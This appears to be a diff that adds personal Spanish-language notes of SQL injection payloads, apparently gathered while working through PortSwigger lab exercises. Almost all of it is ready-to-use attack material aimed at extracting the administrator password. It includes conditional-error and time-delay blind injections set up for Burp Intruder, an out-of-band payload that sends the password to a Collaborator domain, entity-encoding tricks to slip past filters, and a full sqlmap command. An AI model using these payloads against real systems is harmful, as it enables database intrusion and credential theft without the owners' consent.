@@ -1,0 +1,38 @@
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+MIRAR QUÉ ERROR ES Y BUSCAR ARRIBA, PONER PAYLOAD DEL ERROR CONVENIENTE
+
+Basado en errores condicionales
+||(SELECT CASE WHEN LENGTH(password)>19 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')|| 
+||(SELECT CASE WHEN SUBSTR(password,1,1)='§k§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| --> mandar a intruder
+
+Errores con delay 
+%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--   --> mandar a intruder
+
+OAST password a través de Collaborator salida = password.collaborator.com
++UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+SQL encoding a XML
+<@hex_entities>union select table_name from information_schema.tables</@hex_entities>
+<@dec_entities>union select table_name from information_schema.tables</@dec_entities>
+
+<@hex_entities>UNION SELECT concat(username,' < > ',password) FROM users</@hex_entities>
+<@dec_entities>UNION SELECT username |'<>'| password FROM users</@dec_entities>
+
+
+/-/-/-/-/-/-/-/-/-/
+/-/-/ SQLMAP /-/-/
+/-/-/-/-/-/-/-/-/
+
+sudo sqlmap -u 'CURL AS BASH' \
+--cookie='TrackingId=3og8rvtv5gB5G29L; session=OGLfObBslAoqUmF0qZOBxskUuQ0tOKjX' \
+ -p 'TrackingId' --batch --risk 3 --level 5 --threads 10 --flush-session --random-agent --dbms=postgresql -D DATABASE --technique=ST \
+ --sql-query="SELECT password FROM users where username='administrator'"
+
+Puedo no especificarle técnica ni DATABASE 
+
+
+LIMIT(SELECT CAST((SELECT password FROM users LIMIT 1) AS int))
